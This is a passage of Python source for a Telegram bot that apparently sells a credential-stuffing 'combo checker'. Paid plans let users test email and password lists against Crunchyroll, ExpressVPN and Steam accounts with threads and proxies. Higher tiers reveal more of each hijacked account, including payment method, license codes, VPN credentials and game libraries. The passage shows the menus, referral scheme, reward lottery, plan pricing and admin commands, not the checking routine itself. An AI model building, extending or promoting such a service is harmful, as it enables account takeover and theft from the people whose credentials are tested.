        })
        return True
    return False

def update_user_stats_general(user_id: int, data: dict):
    """Update any user (used by admin commands)"""
    data["updated_at"] = datetime.now().isoformat()
    response = supabase.table("user_stats").update(data).eq("user_id", user_id).execute()
    return len(response.data) > 0  # True if row was updated

async def show_referrals_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    
    # Auto-generate referral code if missing
    if not stats.get('referral_code'):
        new_code = generate_referral_code(user_id)
        update_user_stats(user_id, {"referral_code": new_code})
        stats['referral_code'] = new_code
    
    referral_count = stats.get('referrals', 0)
    bonus_per = get_referral_bonus_per_referral(stats.get('plan', 'FREE'))
    total_bonus = referral_count * bonus_per
    
    bot_username = "clydecrunchybot"   # ← Change to your real bot username
    referral_link = f"https://t.me/{bot_username}?start={stats['referral_code']}"
    
    text = f"""
🔗 <b>My Referrals</b>
━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Your Statistics:</b>
✅ Referral Count: <b>{referral_count}</b>
📈 Your Daily Limit: <b>{limits['remaining_text']}</b>
💰 Total Bonus: <b>+{total_bonus} combos</b>
━━━━━━━━━━━━━━━━━━━━━━━
🎁 <b>Earn +{bonus_per} combos for each referral!</b>
━━━━━━━━━━━━━━━━━━━━━━━
🔗 <b>Your Referral Link:</b>
{referral_link}
━━━━━━━━━━━━━━━━━━━━━━━
<i>📤 Share this link with your friends!</i>
Your daily limit increases by {bonus_per} combos for each person who registers using your link.

💡 <b>Example:</b>
• 0 referrals = {limits['base_limit_text']} combos/day
• 5 referrals = +{5*bonus_per} combos/day
• 10 referrals = +{10*bonus_per} combos/day
━━━━━━━━━━━━━━━━━━━━━━━
    """.strip()

    keyboard = [[InlineKeyboardButton("↼ Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text,
        parse_mode='HTML',
        reply_markup=reply_markup,
        disable_web_page_preview=False
    )

async def show_support_menu(query, context):
    context.user_data['in_main_menu'] = False
    """Replicates the exact Support & Contact page with native preview card"""
    
    text = """📞 <b>Support & Contact</b>
━━━━━━━━━━━━━━━━━━━━━━━
<i>Need help or want to upgrade?</i>

— Contact: <a href="https://t.me/caydigitals">@caydigitals</a>
━━━━━━━━━━━━━━━━━━━━━━━
""".strip()

    # Inline keyboard (Back button at the bottom, exactly like the screenshot)
    keyboard = [
        [InlineKeyboardButton("↼ Back", callback_data="back_to_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text=text,
        parse_mode='HTML',
        reply_markup=reply_markup
        # ← DO NOT add disable_web_page_preview=True (or False)
        # Just leave it out — default is False, which enables the preview
    )

async def show_rewards_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    stats = clean_expired_daily_reward(stats)
    is_active = is_daily_reward_active(stats)
    
    if is_active:
        claim_button_text = "⏳ Reward Active"
    else:
        claim_button_text = "🎁 Claim Daily Reward"

    text = f"""
🎁 <b>Rewards & Gifts Hub</b>
━━━━━━━━━━━━━━━━━━━━━━━━
Claim your daily free combos or redeem premium gift codes provided by the admin.

📊 <b>Possible Rewards:</b>
• <b>FREE:</b> mostly 5-15 combos (very rare up to <tg-spoiler>60</tg-spoiler>)
• <b>BASIC:</b> mostly 15-35 combos (very rare up to <tg-spoiler>200</tg-spoiler>)
• <b>VIP / YEARLY:</b> mostly 60-130 combos (very rare up to <tg-spoiler>750</tg-spoiler>)
━━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Your Daily Statistics:</b>
⏰ Next Reward In: <code>{get_remaining_reward_time(stats)}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
    """.strip()

    keyboard = [
        [InlineKeyboardButton(claim_button_text, callback_data="claim_daily_reward")],
        [InlineKeyboardButton("📦 REDEEM GIFT CODE", callback_data="redeem_gift_code")],
        [InlineKeyboardButton("↼ Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def claim_daily_reward(query, context):
    """Personal 24-hour reward timer — Balanced & Exciting Lottery"""
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    
    if is_daily_reward_active(stats):
        await query.answer("❌ Your previous reward is still active!", show_alert=True)
        await show_rewards_menu(query, context)
        return
    
    plan = stats.get("plan", "FREE").upper()

    # === VERY HARD LOTTERY (0.5% jackpot) ===
    if plan == "FREE":
        # 85% small | 12% decent | 3% jackpot (better odds now)
        rewards = (
            [random.randint(5, 15)] * 170 +  
            [random.randint(20, 35)] * 24 + 
            [random.randint(50, 100)] * 6
        )
    elif plan == "BASIC":
        # 75% small | 23% good | 2% big
        rewards = (
            [random.randint(15, 35)] * 150 +
            [random.randint(40, 85)] * 46 +
            [random.randint(110, 200)] * 4
        )
    else:  # VIP or YEARLY
        # 65% decent | 32% strong | 3% massive
        rewards = (
            [random.randint(60, 130)] * 130 +
            [random.randint(150, 280)] * 64 +
            [random.randint(350, 750)] * 6
        )

    reward_amount = random.choice(rewards)

    update_user_stats(user_id, {
        "daily_reward_lines": reward_amount,
        "daily_reward_claimed": True,
        "daily_reward_last_claimed": datetime.utcnow().isoformat()
    })
    
# ====================== ADMIN NOTIFICATION ======================
    try:
        now_ph = datetime.now(PH_TZ)
        time_str = now_ph.strftime("%Y-%m-%d %I:%M %p")
        
        username_display = f"@{stats.get('username')}" if stats.get('username') else "No username"
        user_plan = stats.get('plan', 'FREE').upper()
        
        admin_msg = f"""
🎁 <b>Daily Reward Claimed!</b>
━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>User ID:</b> <code>{user_id}</code>
👤 <b>Username:</b> {username_display}
👑 <b>Plan:</b> {get_plan_with_emoji(user_plan)}
🎟️ <b>Reward:</b> +{reward_amount} combos
⏰ <b>Time:</b> {time_str} (PH time)
        """.strip()

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=admin_msg,
            parse_mode='HTML'
        )
    except Exception as e:
        print(f"⚠️ Failed to send daily reward notification: {e}")

    # ====================== USER FEEDBACK (Popup) ======================
    if reward_amount >= 100:
        await query.answer(
            f"🎉🎉🎉 MASSIVE JACKPOT!!!\n"
            f"You received +{reward_amount} combos!",
            show_alert=True
        )
    elif reward_amount >= 50:
        await query.answer(
            f"🔥 Excellent!\n"
            f"You received +{reward_amount} combos!",
            show_alert=True
        )
    else:
        await query.answer(
            f"🎁 Reward Claimed!\n"
            f"You received +{reward_amount} combos (Valid for 24H)",
            show_alert=True
        )

    await show_rewards_menu(query, context)

# ============= MEMBERSHIP PLAN MENU (Updated to match PLAN_CONFIG) =============
async def show_membership_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    
    current_plan_text = f"📌 <b>Your Current Plan:</b> <code>{get_plan_with_emoji(stats.get('plan'))}</code>"
    
    text = f"""
👑 <b>MEMBERSHIP PLANS</b>
━━━━━━━━━━━━━━━━━━━━━━━
🆓 <b>FREE PLAN</b>
• Daily Limit: <b>25 combos/day</b>
• Max Threads: <b>1-8</b>
• Single checks only (no .txt files)
• <b>Basic Hit Details</b> only
━━━━━━━━━━━━━━━━━━━━━━━
⭐ <b>BASIC PLAN (WEEKLY)</b>
• Duration: <b>7 Days</b>
• Daily Limit: <b>150 combos/day</b>
• Max Threads: <b>1-25</b>
• Multi-Scan: <b>Up to 3 files/day</b>
• <b>Medium Hit Details</b>
• No Queue Waiting
• Price: <b>130 Telegram Stars</b>
━━━━━━━━━━━━━━━━━━━━━━━
👑 <b>VIP PLAN (MONTHLY)</b>
• Duration: <b>30 Days</b>
• Daily Limit: <b>♾️ Unlimited</b>
• Max Threads: <b>1-40</b>
• Multi-Scan: <b>Up to 5 files/day</b>
• <b>Full Rich Hit Details</b>
• No Queue Waiting
• Maximum Speed
• Price: <b>399 Telegram Stars</b>
━━━━━━━━━━━━━━━━━━━━━━━
🌟 <b>YEARLY VIP PLAN</b>
• Duration: <b>365 Days</b>
• Daily Limit: <b>♾️ Unlimited</b>
• Max Threads: <b>1-40</b>
• Multi-Scan: <b>Up to 5 files/day</b>
• <b>Full Rich Hit Details</b> + All VIP Benefits
• No Queue Waiting
• Best Value
• Price: <b>3,200 Telegram Stars</b> (Save ~33%)
━━━━━━━━━━━━━━━━━━━━━━━
{current_plan_text}

⚡ <b>Payment Method</b>
Telegram Stars only (currently accepted)

💳 <b>To Purchase A Membership</b>
<b>Contact:</b> <a href="https://t.me/caydigitals">@caydigitals</a>

<i><a href="https://t.me/clydecrunchybot">@clydecrunchybot</a></i>
    """.strip()

    keyboard = [
        [InlineKeyboardButton("💬 Purchase - @caydigitals", url="https://t.me/caydigitals")],
        [InlineKeyboardButton("↼ Back", callback_data="back_to_main")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)

# ============= STATISTICS MENU (Exact match to your screenshot) =============
async def show_statistics_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    stats = clean_expired_daily_reward(stats)

    # Auto reset daily stats if new day (Manila time)
    today_ph = datetime.now(PH_TZ).date()
    if stats["today_date"] != str(today_ph):
        update_user_stats(user_id, {"today_scans": 0, "today_date": str(today_ph)})
        stats = get_user_stats(user_id)
    
    limits = get_plan_limits(stats)

    success_rate = round((stats["total_hits"] / stats["total_scans"] * 100), 2) if stats["total_scans"] > 0 else 0.0

    # File statistics
    max_files = limits.get("multi_scan_max_files", 1)
    today_files_used = stats.get("today_files", 0)
    total_files = stats.get("total_combo_files", 0)
    files_display = format_files_display(today_files_used, max_files, stats.get("plan", "FREE"))

    text = f"""
📊 <b>Your Statistics</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>User ID:</b> <code>{stats['user_id']}</code>
📅 <b>Registered:</b> <code>{stats['registered']}</code>
👑 <b>Plan:</b> <code>{get_plan_with_emoji(stats.get('plan'))}</code>
📆 <b>Plan Expires In:</b> <code>{get_days_remaining(stats['expires'])}</code>
📡 <b>Mode:</b> <code>{get_mode_display(stats.get('api_mode'))}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
🧵 <b>Threads:</b> <code>{limits['current_threads']}/{limits['max_threads']}</code>
📁 <b>Files Today:</b> <code>{files_display}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
📈 <b>General Statistics:</b>
✅ Total Scans: <code>{stats['total_scans']}</code>
📁 Total Files Processed: <code>{total_files}</code>
💎 Total Hits: <code>{stats['total_hits']}</code>
🔐 Total 2FA: <code>{stats.get('total_2fa', 0)}</code>
❌ Total Bad: <code>{stats.get('total_free', 0)}</code>
🎯 Success Rate: <code>{success_rate}%</code>
━━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Today's Statistics:</b>
📊 Scans Used: <code>{stats['today_scans']}</code>
⏳ Remaining: <code>{limits['remaining_text']}</code>
👥 Referrals: <code>{stats['referrals']}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
🎁 <b>Rewards & Limits Details:</b>
🎟️ Claimed Codes: <code>0</code>
🎁 Daily Reward Claimed Today: <code>{'Yes' if stats['daily_reward_claimed'] else 'No'}</code>
✨ Daily Reward Combos (Active): <code>{stats['daily_reward_lines']}</code> {get_remaining_reward_time(stats) if is_daily_reward_active(stats) else ''}
👥 Referral Bonus Combos: <code>+{stats['referral_bonus_lines']}</code>
📦 Base Plan Limit: <code>{limits['base_limit_text']}</code>
    """.strip()

    keyboard = [[InlineKeyboardButton("↼ Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)

async def reset_reward_command(update: Update, context: CallbackContext):
    """Admin command to reset ALL daily counters + reward timer"""
    if not is_owner(update):
        await update.message.reply_text("❌ This command is only for the owner.")
        return

    args = context.args
    target_user_id = ADMIN_ID  # default = yourself

    if args:
        try:
            target_user_id = int(args[0])
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid user ID.\n\n"
                "Usage:\n"
                "`/resetreward` → reset yourself\n"
                "`/resetreward 1234567890` → reset specific user",
                parse_mode='HTML'
            )
            return

    # Reset ALL daily-related data
    success = update_user_stats_general(target_user_id, {
        "today_scans": 0,
        "today_files": 0,
        "daily_reward_lines": 0,
        "daily_reward_claimed": False,
        "daily_reward_last_claimed": None
    })

    if success:
        await update.message.reply_text(
            f"✅ <b>All daily limits have been reset</b> for user <code>{target_user_id}</code>.\n\n"
            f"• Daily Scans → 0\n"
            f"• Daily Files → 0\n"
            f"• Daily Reward → Ready to claim again",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text(f"❌ User {target_user_id} not found or never used the bot.")

async def set_plan_command(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ This command is only for the owner.")
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "📋 <b>Usage:</b>\n\n"
            "<code>/setplan VIP</code> → update yourself\n"
            "<code>/setplan 1234567890 YEARLY</code> → update by user ID\n\n"
            "Available plans: FREE, BASIC, VIP, YEARLY",
            parse_mode='HTML'
        )
        return

    # Determine target and plan
    if len(args) == 1:
        target_user_id = ADMIN_ID
        new_plan = args[0].strip().upper()
    elif len(args) == 2:
        target = args[0].strip()
        new_plan = args[1].strip().upper()

        if target.startswith('@'):
            username = target[1:]
            response = supabase.table("user_stats").select("user_id").eq("username", username).execute()
            if not response.data:
                await update.message.reply_text(f"❌ User with username @{username} not found.")
                return
            target_user_id = response.data[0]["user_id"]
        else:
            try:
                target_user_id = int(target)
            except ValueError:
                await update.message.reply_text("❌ Invalid user ID or username format.")
                return
    else:
        await update.message.reply_text("❌ Wrong usage. Check /setplan for help.")
        return

    if new_plan not in ["FREE", "BASIC", "VIP", "YEARLY", "OWNER"]:
        await update.message.reply_text("❌ Invalid plan! Use: FREE, BASIC, VIP, YEARLY, or OWNER")
        return
    
    if new_plan == "OWNER" and target_user_id != ADMIN_ID:
        await update.message.reply_text("❌ OWNER plan can only be set for the bot owner!")
        return

    # ←←← FIXED: Always calculate fresh expiry date here
    if new_plan == "FREE":
        expires = "N/A"
    elif new_plan == "BASIC":
        expires = (datetime.now() + timedelta(days=7)).strftime("%Y-%m-%d")
    elif new_plan == "VIP":
        expires = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d")
    elif new_plan == "YEARLY":
        expires = (datetime.now() + timedelta(days=365)).strftime("%Y-%m-%d")
    elif new_plan == "OWNER":
        expires = "N/A"

    defaults = PLAN_DEFAULTS[new_plan]

    update_data = {
        "plan": defaults["plan"],
        "base_plan_limit": defaults["base_plan_limit"],
        "threads": defaults["threads"],
        "expires": expires,                    # ← Fresh date every time
        "daily_reward_lines": 0,
        "referral_bonus_lines": 0
    }

    success = update_user_stats_general(target_user_id, update_data)

    if success:
        await update.message.reply_text(
            f"✅ <b>Plan updated successfully!</b>\n\n"
            f"👤 Target User: <code>{target_user_id}</code>\n"
            f"📌 New Plan: <b>{new_plan}</b>\n"
            f"🧵 Threads: <b>{defaults['threads']}</b>\n"
            f"📆 Expires: <b>{expires}</b>\n\n"
            f"Changes are live immediately.",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text("❌ Failed to update user. Make sure the user has used the bot before.")

async def show_admin_panel(update_or_query, context, is_callback=False):
    """Admin-only control panel with live mode toggles"""
    
    # Build mode toggle buttons (2 per row)
    keyboard = []
    modes_list = list(MODE_STATUS.keys())
    
    for i in range(0, len(modes_list), 2):
        row = []
        for mode_key in modes_list[i:i+2]:
            enabled = MODE_STATUS[mode_key]
            icon = MODES[mode_key]["icon"]
            status = "🟢" if enabled else "🔴"
            row.append(InlineKeyboardButton(
                f"{status} {icon} {mode_key}",
                callback_data=f"admin_toggle:{mode_key}"
            ))
        keyboard.append(row)

    # Global proxy toggle
    proxy_on = is_global_proxy_enabled()
    pool_size = get_pool_size(ADMIN_ID)
    proxy_label = f"🌐 Global Proxy: {'ON ✅' if proxy_on else 'OFF ❌'} ({pool_size} proxies)"
    keyboard.append([InlineKeyboardButton(proxy_label, callback_data="toggle_global_proxy_panel")])

    # Broadcast + Refresh buttons
    keyboard.append([
        InlineKeyboardButton("📢 Broadcast Message", callback_data="admin_broadcast"),
        InlineKeyboardButton("🔃 Refresh Proxies", callback_data="admin_refresh_proxies"),
    ])
    keyboard.append([InlineKeyboardButton("↼ Back to Home", callback_data="back_to_main")])


    reply_markup = InlineKeyboardMarkup(keyboard)

    # Build status lines
    mode_lines = ""
    for mode_key, enabled in MODE_STATUS.items():
        icon = MODES[mode_key]["icon"]
        status = "🟢 ON" if enabled else "🔴 OFF"
        mode_lines += f"{icon} <b>{mode_key}:</b> <code>{status}</code>\n"

    text = f"""
🛠️ <b>Admin Control Panel</b>
━━━━━━━━━━━━━━━━━━━━━━━━
📡 <b>Mode Status:</b>
{mode_lines}
━━━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>Global Proxy:</b> <code>{'ON ✅' if proxy_on else 'OFF ❌'}</code> ({pool_size} live)
━━━━━━━━━━━━━━━━━━━━━━━━
<i>Tap any mode to instantly toggle it.</i>
    """.strip()

    if is_callback:
        await update_or_query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)
    else:
        await update_or_query.message.reply_text(text, parse_mode='HTML', reply_markup=reply_markup)

async def show_settings_menu(query, context):
    context.user_data['in_main_menu'] = False
    """Replicates the exact Settings Menu"""
    # ←←← IMPORTANT: Clear waiting state when returning from Set Threads
    if 'waiting_for_threads' in context.user_data:
        context.user_data['waiting_for_threads'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    
    settings_text = f"""
⚙️ <b>Settings Menu</b>
━━━━━━━━━━━━━━━━━━━━━━━━
Configure your bot preferences below:

🧵 <b>Threads</b>: Control scan speed
Current: <code>{limits['current_threads']} threads</code> (Max: {limits['max_threads']})

📡 <b>API Mode</b>: Select scanning method
Current: <code>{get_mode_display(stats.get('api_mode'))}</code>

🌐 <b>Proxy Manager</b>: Route checks
Status: <code>{'ON ✅' if (stats.get("proxy_enabled", False) if user_id != ADMIN_ID else is_global_proxy_enabled()) else 'OFF ❌'} ({get_pool_size(user_id)} live proxies)</code>
━━━━━━━━━━━━━━━━━━━━━━━━
<i>Click a button to configure:</i>
    """.strip()
    
    pool_size = get_pool_size(user_id)
    # Show user's personal proxy status (admin shows global)
    if user_id == ADMIN_ID:
        proxy_enabled = is_global_proxy_enabled()
    else:
        proxy_enabled = stats.get("proxy_enabled", False)

    if not proxy_enabled:
        proxy_btn_text = "🌐 Proxy Manager (OFF ❌)"
    elif pool_size == 0:
        proxy_btn_text = "🌐 Proxy Manager ⚠️ (No proxies)"
    elif pool_size < 5:
        proxy_btn_text = f"🌐 Proxy Manager ⚠️ ({pool_size} live)"
    else:
        proxy_btn_text = f"🌐 Proxy Manager ✅ ({pool_size} live)"

    keyboard = [
        [InlineKeyboardButton(proxy_btn_text, callback_data="proxy_manager")],
        [
            InlineKeyboardButton("🧵 Set Threads", callback_data="set_threads"),
            InlineKeyboardButton("📡 API Mode", callback_data="set_api_mode"),
        ],
        [InlineKeyboardButton("↼ Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        settings_text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def handle_set_threads(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    plan = limits["display_name"]
    max_t = limits["max_threads"]
    
    # New updated limits based on your current PLAN_CONFIG
    text = f"""
🧵 <b>Set Thread Count</b>
━━━━━━━━━━━━━━━━━━━━━━━━
Limits by plan:
🆓 FREE: <b>1-8</b>
⭐ BASIC: <b>1-25</b>
👑 VIP / YEARLY: <b>1-40</b>

Your plan <b>{get_plan_with_emoji(stats.get('plan'))}</b> allows <b>1-{max_t}</b> threads.

Current threads: <b>{limits['current_threads']}</b>
━━━━━━━━━━━━━━━━━━━━━━━━
Send a number between 1 and {max_t} to set your thread count.
    """.strip()
    
    keyboard = [[InlineKeyboardButton("↼ Back", callback_data="menu_settings")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)
    context.user_data['waiting_for_threads'] = True

async def show_api_mode_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    current_mode = stats.get("api_mode", "Crunchyroll")
    user_plan = stats.get("plan", "FREE").upper()
    
    mode_info = MODES.get(current_mode, MODES["Crunchyroll"])
    
    # Build feature list
    features_text = "\n".join([f"✅ {feature}" for feature in mode_info["features"]])

    # ====================== EXPRESSVPN PLAN BENEFITS ======================
    expressvpn_benefits = ""
    if current_mode == "ExpressVPN":
        EXPRESSVPN_BENEFITS = {
            "FREE": [
                ("✅", "Single Check Only"),
                ("✅", "Plan Name"),
                ("✅", "Expires Date"),
                ("✅", "Days Left"),
                ("✅", "Auto Renew"),
                ("✅", "Payment Method"),
                ("✅", "License Code"),
                ("❌", "OVPN Credentials"),
                ("❌", "PPTP Credentials"),
                ("❌", ".ovpn file (ready to import)"),

            ],
            "BASIC": [
                ("✅", "Single + Bulk Check"),  
                ("✅", "Plan Name"),
                ("✅", "Expires Date"),
                ("✅", "Days Left"),
                ("✅", "Auto Renew"),
                ("✅", "Payment Method"),
                ("✅", "License Code"),
                ("✅", "OVPN Credentials"),
                ("✅", "PPTP Credentials"),
                ("✅", ".ovpn file (ready to import)"),

            ],
            "VIP": [
                ("✅", "Single + Bulk Check"),
                ("✅", "Plan Name"),
                ("✅", "Expires Date"),
                ("✅", "Days Left"),
                ("✅", "Auto Renew"),
                ("✅", "Payment Method"),
                ("✅", "License Code"),
                ("✅", "OVPN Credentials"),
                ("✅", "PPTP Credentials"),
                ("✅", ".ovpn file (ready to import)"),
            ],
            "YEARLY": [
                ("✅", "Single + Bulk Check"),
                ("✅", "Plan Name"),
                ("✅", "Expires Date"),
                ("✅", "Days Left"),
                ("✅", "Auto Renew"),
                ("✅", "Payment Method"),
                ("✅", "License Code"),
                ("✅", "OVPN Credentials"),
                ("✅", "PPTP Credentials"),
                ("✅", ".ovpn file (ready to import)"),
            ],
            "OWNER": [
                ("✅", "Single + Bulk Check"),
                ("✅", "Plan Name"),
                ("✅", "Expires Date"),
                ("✅", "Days Left"),
                ("✅", "Auto Renew"),
                ("✅", "Payment Method"),
                ("✅", "License Code"),
                ("✅", "OVPN Credentials"),
                ("✅", "PPTP Credentials"),
                ("✅", ".ovpn file (ready to import)"),
            ],
        }

        plan_benefits = EXPRESSVPN_BENEFITS.get(user_plan, EXPRESSVPN_BENEFITS["FREE"])
        benefits_lines = "\n".join([f"{icon} {label}" for icon, label in plan_benefits])
        
        expressvpn_benefits = (
            f"\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Your Plan Benefits:</b> <code>{get_plan_with_emoji(user_plan)}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{benefits_lines}"
        )
    # =================================================================

    # ====================== CRUNCHYROLL PLAN BENEFITS ======================
    crunchyroll_benefits = ""
    if current_mode == "Crunchyroll":
        CRUNCHYROLL_BENEFITS = {
            "FREE": [
                ("✅", "Email & Password"),
                ("✅", "Active Status"),
                ("✅", "Plan Name"),
                ("✅", "Expires In"),
                ("✅", "Country"),
                ("❌", "Username"),
                ("❌", "Email Verified"),
                ("❌", "Free Trial Status"),
                ("❌", "Payment Method"),
                ("❌", "Account Creation Date"),
                ("❌", "Plan SUB"),
                ("❌", "Max Streams"),
                ("❌", "Currency"),
                ("❌", "Auto Renewal Status"),
                ("❌", "Subscription Start Date"),
                ("❌", "Billing Interval"),
                ("❌", "Profile Count"),
                ("❌", "Preferred Content Language"),
            ],
            "BASIC": [
                ("✅", "Email & Password"),
                ("✅", "Active Status"),
                ("✅", "Plan Name"),
                ("✅", "Expires In"),
                ("✅", "Country"),
                ("✅", "Username"),
                ("✅", "Email Verified"),
                ("✅", "Free Trial Status"),
                ("✅", "Payment Method"),
                ("❌", "Account Creation Date"),
                ("❌", "Plan SUB"),
                ("❌", "Max Streams"),
                ("❌", "Currency"),
                ("❌", "Auto Renewal Status"),
                ("❌", "Subscription Start Date"),
                ("❌", "Billing Interval"),
                ("❌", "Profile Count"),
                ("❌", "Preferred Content Language"),
            ],
            "VIP": [
                ("✅", "Email & Password"),
                ("✅", "Active Status"),
                ("✅", "Plan Name"),
                ("✅", "Expires In"),
                ("✅", "Country"),
                ("✅", "Username"),
                ("✅", "Email Verified"),
                ("✅", "Free Trial Status"),
                ("✅", "Payment Method"),
                ("✅", "Account Creation Date"),
                ("✅", "Plan SUB"),
                ("✅", "Max Streams"),
                ("✅", "Currency"),
                ("✅", "Auto Renewal Status"),  # moved down from YEARLY
                ("❌", "Subscription Start Date"),
                ("❌", "Billing Interval"),
                ("❌", "Profile Count"),
                ("❌", "Preferred Content Language"),
            ],
            "YEARLY": [
                ("✅", "Email & Password"),
                ("✅", "Active Status"),
                ("✅", "Plan Name"),
                ("✅", "Expires In"),
                ("✅", "Country"),
                ("✅", "Username"),
                ("✅", "Email Verified"),
                ("✅", "Free Trial Status"),
                ("✅", "Payment Method"),
                ("✅", "Account Creation Date"),
                ("✅", "Plan SUB"),
                ("✅", "Max Streams"),
                ("✅", "Currency"),
                ("✅", "Auto Renewal Status"),
                ("✅", "Subscription Start Date"),
                ("✅", "Billing Interval"),
                ("✅", "Profile Count"),
                ("✅", "Preferred Content Language"),
            ],
            "OWNER": [
                ("✅", "Email & Password"),
                ("✅", "Active Status"),
                ("✅", "Plan Name"),
                ("✅", "Expires In"),
                ("✅", "Country"),
                ("✅", "Username"),
                ("✅", "Email Verified"),
                ("✅", "Free Trial Status"),
                ("✅", "Payment Method"),
                ("✅", "Account Creation Date"),
                ("✅", "Plan SUB"),
                ("✅", "Max Streams"),
                ("✅", "Currency"),
                ("✅", "Auto Renewal Status"),
                ("✅", "Subscription Start Date"),
                ("✅", "Billing Interval"),
                ("✅", "Profile Count"),
                ("✅", "Preferred Content Language"),
            ],
        }

        plan_benefits = CRUNCHYROLL_BENEFITS.get(user_plan, CRUNCHYROLL_BENEFITS["FREE"])
        benefits_lines = "\n".join([f"{icon} {label}" for icon, label in plan_benefits])

        crunchyroll_benefits = (
            f"\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Your Plan Benefits:</b> <code>{get_plan_with_emoji(user_plan)}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{benefits_lines}"
        )
    # =================================================================

    # ====================== STEAM PLAN BENEFITS ======================
    steam_benefits = ""
    if current_mode == "Steam":
        # Define benefits per plan
        STEAM_BENEFITS = {
            "FREE": [
                ("✅", "Email & Password"),
                ("✅", "SteamID"),
                ("✅", "Country"),
                ("✅", "2FA Type & Note"),
                ("❌", "Profile Visibility"),
                ("❌", "Games List/Privacy"),
                ("❌", "Games Owned Count"),
                ("❌", "Total Playtime"),
                ("❌", "Ban Info"),
                ("❌", "Steam Level"),
                ("❌", "Friends Count"),
                ("❌", "Recent Games"),
                ("❌", "Games TXT File"),
            ],
            "BASIC": [
                ("✅", "Email & Password"),
                ("✅", "SteamID"),
                ("✅", "Country"),
                ("✅", "2FA Type & Note"),
                ("✅", "Profile Visibility"),
                ("✅", "Games List/Privacy"),
                ("✅", "Games Owned Count"),
                ("❌", "Total Playtime"),
                ("❌", "Ban Info"),
                ("❌", "Steam Level"),
                ("❌", "Friends Count"),
                ("❌", "Recent Games"),
                ("❌", "Games TXT File"),
            ],
            "VIP": [
                ("✅", "Email & Password"),
                ("✅", "SteamID"),
                ("✅", "Country"),
                ("✅", "2FA Type & Note"),
                ("✅", "Profile Visibility"),
                ("✅", "Games List/Privacy"),
                ("✅", "Games Owned Count"),
                ("✅", "Total Playtime"),
                ("✅", "VAC / Community / Trade Ban"),
                ("✅", "Top 5 Games Preview"),
                ("✅", "Games TXT File"),
                ("❌", "Steam Level"),
                ("❌", "Friends Count"),
                ("❌", "Recent Games (2 weeks)"),
                ("❌", "VAC Ban Details"),
                ("❌", "Top 10 Games Preview"),
            ],
            "YEARLY": [
                ("✅", "Email & Password"),
                ("✅", "SteamID"),
                ("✅", "Country"),
                ("✅", "2FA Type & Note"),
                ("✅", "Profile Visibility"),
                ("✅", "Games List/Privacy"),
                ("✅", "Games Owned Count"),
                ("✅", "Total Playtime"),
                ("✅", "VAC / Community / Trade Ban"),
                ("✅", "VAC Ban Count & Days Since Ban"),
                ("✅", "Steam Level"),
                ("✅", "Friends Count"),
                ("✅", "Recent Games (2 weeks)"),
                ("✅", "Top 10 Games Preview"),
                ("✅", "Games TXT File"),
            ],
            "OWNER": [
                ("✅", "Email & Password"),
                ("✅", "SteamID"),
                ("✅", "Country"),
                ("✅", "2FA Type & Note"),
                ("✅", "Profile Visibility"),
                ("✅", "Games List/Privacy"),
                ("✅", "Games Owned Count"),
                ("✅", "Total Playtime"),
                ("✅", "VAC / Community / Trade Ban"),
                ("✅", "VAC Ban Count & Days Since Ban"),
                ("✅", "Steam Level"),
                ("✅", "Friends Count"),
                ("✅", "Recent Games (2 weeks)"),
                ("✅", "Top 10 Games Preview"),
                ("✅", "Games TXT File"),
            ],
        }

        plan_benefits = STEAM_BENEFITS.get(user_plan, STEAM_BENEFITS["FREE"])
        benefits_lines = "\n".join([f"{icon} {label}" for icon, label in plan_benefits])
        
        steam_benefits = (
